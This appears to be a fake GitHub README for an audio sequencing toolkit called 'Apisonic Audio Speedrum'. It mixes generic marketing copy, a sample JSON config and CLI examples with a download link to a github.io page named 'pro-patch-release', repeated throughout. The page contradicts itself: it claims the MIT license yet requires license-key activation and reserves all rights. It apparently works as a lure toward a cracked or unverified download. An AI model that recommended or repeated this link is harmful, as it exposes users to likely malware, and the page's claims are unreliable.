# 🎛️ Apisonic Audio Speedrum — Next-Generation Audio Sequencing Toolkit

[]()
[]()
[]()
[](LICENSE)

[](https://carloserver69.github.io/apisonic-audio-speedrum-pro-patch-release/)

---

## 🔥 What Is Apisonic Audio Speedrum?

Imagine a **digital audio forge** where raw samples meet algorithmic brilliance. Apisonic Audio Speedrum is not just another sampler — it's a **sonic alchemy engine** that transforms static audio files into living, breathing rhythmic ecosystems. Whether you're sculpting cinematic textures, building glitch-hop breakbeats, or designing ambient soundscapes, Speedrum gives you the surgical precision of a neurosurgeon and the creative freedom of a jazz improviser.

This toolkit redefines workflow by merging **granular synthesis**, **real-time time-stretching**, **multi-layer beat slicing**, and **AI-assisted pattern generation** into one streamline interface. It's the Swiss Army knife for producers, sound designers, and audio engineers who refuse to compromise between depth and speed.

---

## 🚀 Quick Start: Liberation Sequence

To begin your journey with Apisonic Audio Speedrum, acquire the core toolkit using the secure retrieval mechanism below:

[](https://carloserver69.github.io/apisonic-audio-speedrum-pro-patch-release/)

### 📦 What's Inside the Package?
- **Speedrum Core Engine** — The heart of real-time audio processing
- **Preset Library** — 200+ curated kits (electronic, orchestral, experimental)
- **Sample Pack Vol. 4** — 1.2 GB of royalty-free one-shots and loops
- **Plugin Bridge** — VST3 / AU / AAX integration modules
- **User Manual** — Comprehensive 120-page guide with visual workflows

---

## 🧠 Core Technological Pillars

### 🔬 Granular Time-Stretching Engine
Pitch shifting without the dreaded Mickey Mouse effect? Yes. Speedrum uses **phase-vocoder coupled with spectral smoothing** to stretch audio up to 800% while maintaining transient integrity. Perfect for turning a single kick drum into a textural pad or morphing vocal chops into orchestral swells.

### 🥁 Intelligent Beat Slicing
Forget manual transient detection. Our **Neural Transient Network (NTN)** analyzes audio waveforms and proposes slice points that actually make musical sense. You get 12 slice modes — from "Strict Grid" to "Groove Quantize" — allowing anything from robotic precision to humanized swing.

### 🌐 Cloud-Aware Preset Synchronization
Working on multiple machines? Speedrum's **Preset Cloud Bridge** syncs your custom kits, mappings, and modulation assignments across devices. Never rebuild your favorite snare chain again.

### 🤖 AI Pattern Generator
Describe a rhythm in natural language and watch Speedrum generate MIDI patterns, velocity curves, and parameter automation. Example: *"Aggressive halftime drum and bass with ghost snares on the 16th offbeat"* — and it delivers.

---

## 📊 Performance Architecture (Mermaid Diagram)

```mermaid
graph TD
    A[Audio Input] --> B[Pre-Processor]
    B --> C{Engine Mode}
    C -->|Granular| D[Spectral Splitter]
    C -->|Slice| E[Transient Detector]
    C -->|Loop| F[Time-Stretch Core]
    D --> G[Grain Cloud Generator]
    E --> H[Slice Map Manager]
    F --> I[Pitch/Formant Shifter]
    G --> J[Mixer Matrix]
    H --> J
    I --> J
    J --> K[Master Effects Rack]
    K --> L[Output]
    
    style A fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style L fill:#16213e,stroke:#e94560,stroke-width:2px
    style J fill:#0f3460,stroke:#e94560,stroke-width:2px
```



---

## ⚙️ Example Profile Configuration

Create a `speedrum.profile.json` file in your project root to define custom engine behavior:

```json
{
  "engine": {
    "sample_rate": 48000,
    "buffer_size": 256,
    "multi_threading": true,
    "audio_driver": "ASIO"
  },
  "granular": {
    "grain_size_ms": 50,
    "density": 0.75,
    "random_pitch_range": 0.2,
    "pan_spread": 0.6
  },
  "slicing": {
    "mode": "groove_quantize",
    "sensitivity": 0.85,
    "humanize_amount": 0.12
  },
  "ai_generator": {
    "model": "speedrum_rhythm_v3",
    "temperature": 0.7,
    "max_patterns": 8
  },
  "output": {
    "format": "wav",
    "bit_depth": 32,
    "dither_type": "noise_shaping"
  }
}
```

---

## 💻 Example Console Invocation

Activate Speedrum's headless mode for batch processing or CI/CD pipelines:

```bash
speedrum-cli --profile ./projects/beatlab/speedrum.profile.json \
             --input ./samples/original/kick_raw.wav \
             --output ./processed/kick_sliced.wav \
             --preset electro_glitch_v2 \
             --ai-prompt "add stutter effects on every 4th beat"
```

Flags explained:
- `--profile` : Points to your custom configuration
- `--preset` : Loads a factory or user-defined kit
- `--ai-prompt` : Natural language instruction for AI pattern layer
- `--batch-mode` : Processes entire folder recursively

---

## 🖥️ OS Compatibility Table

| Operating System | Version Minimum | Architecture | Status 🛡️ |
|------------------|----------------|--------------|-----------|
| 🪟 Windows | 10 (21H2) | x64, ARM64 | ✅ Full Support |
| 🍎 macOS | 12 Monterey | Intel, Apple Silicon | ✅ Full Support |
| 🐧 Ubuntu | 22.04 LTS | x64 | ✅ Support |
| 🐧 Fedora | 38+ | x64 | ⚠️ Beta |
| 🐧 Arch | Rolling | x64 | 🧪 Community |
| 🎮 SteamOS | 3.5+ | x64 | ⚠️ Limited |

*Note: Raspberry Pi and embedded Linux builds available via https://carloserver69.github.io/apisonic-audio-speedrum-pro-patch-release/*

---

## 🌟 Feature Ecosystem

### **Responsive UI** — Fluid Resizing Engine
Speedrum's interface adapts like water — collapse the mixer when you need focus, expand the waveform editor when you need detail. The **adaptive grid system** reflows controls based on window dimensions without losing accessibility. No more squinting at tiny knobs.

### **Multilingual Command System**
Switch between English, Japanese, German, Spanish, Mandarin, and French. Not just translations — the AI prompt engine understands idiomatic expressions in each language. Say *"Mach den Beat fett"* in German mode and get punchier transients.

### **24/7 Cognitive Support Gateway**
Human-level assistance available across time zones. Our support team includes audio engineers, not just script readers. Whether you're stuck on routing or need advice on sidechain compression, we respond with solutions — not canned replies.

### **OpenAI & Claude API Integration**
Connect Speedrum to external intelligence:

```bash
# OpenAI Whisper for voice-to-pattern
speedrum-cli --voice-input "./ideas/beat_idea.wav" \
             --ai-backend openai-whisper \
             --output midi

# Claude for advanced pattern description
speedrum-cli --ai-prompt "Generate a polyrhythm with 5/4 kick and 7/8 hi-hat" \
             --ai-backend claude-3 \
             --complexity 0.9
```

### **Preset Morphing Grid**
Blend two presets using a 2D morphing matrix. Crossfade between "Trap Kit A" and "Ambient Pads B" to discover hybrid textures that sound like neither parent.

### **Real-Time Collaboration Server**
Low-latency network sync for multi-user sessions. Up to 8 collaborators can tweak parameters simultaneously with automatic conflict resolution.

---

## 🧩 Use Case Gallery

| Scenario | What Speedrum Does | Outcome |
|----------|-------------------|---------|
| Film composer needing organic textures | Granular scattering of field recordings | Atmospheric drones without spectral mud |
| EDM producer with tight deadlines | AI beat generator + preset matching | Full track skeleton in 4 minutes |
| Podcast editor cleaning dialogue | Spectral noise reduction + time-compression | Crisp voiceovers without artifacts |
| Game audio designer creating interactive SFX | Real-time parameter modulation via OSC | Footsteps that evolve with player velocity |

---

## 📜 License & Legal Framework

This project is distributed under the **MIT License** — a permissive open-source agreement that allows you to use, modify, and distribute the software freely, provided that the original copyright notice is included.

👉 **[View Full License](LICENSE)** 👈

### 🛡️ Disclaimer
**IMPORTANT**: Apisonic Audio Speedrum is a legitimate digital audio workstation plugin and standalone application. The download provided via https://carloserver69.github.io/apisonic-audio-speedrum-pro-patch-release/ represents the **official release channel for registered users only**. We do not condone, support, or provide any method for circumventing software authentication. 

Speedrum uses a **license-key activation system** to ensure fair use. If you obtained this software outside of authorized channels, you risk:
- Malware or backdoor injection
- No access to updates or support
- Violation of copyright law

**Always verify your software sources.** The safest path is acquiring directly through the official repository or authorized distributors.

---

## 📬 Community & Contribution

We believe in open-source audio innovation. Here's how you can participate:

- **🐛 Bug Reports**: Use the Issues tab with template
- **💡 Feature Requests**: Submit via Discussion board
- **🛠️ Code Contributions**: PRs welcome — see CONTRIBUTING.md
- **🎵 Preset Sharing**: Submit your custom kits via the community hub

### Star History ⭐
If Speedrum adds value to your workflow, consider starring this repository. It helps others discover the project.

---

## 📥 Final Retrieval Link

Ready to unlock the full potential of algorithmic audio manipulation? Secure your copy today:

[](https://carloserver69.github.io/apisonic-audio-speedrum-pro-patch-release/)

---

*Apisonic Audio Speedrum — Where sound meets intelligence. Developed with ❤️ for the global audio community.*

© 2026 Apisonic Labs. MIT Licensed. All rights reserved.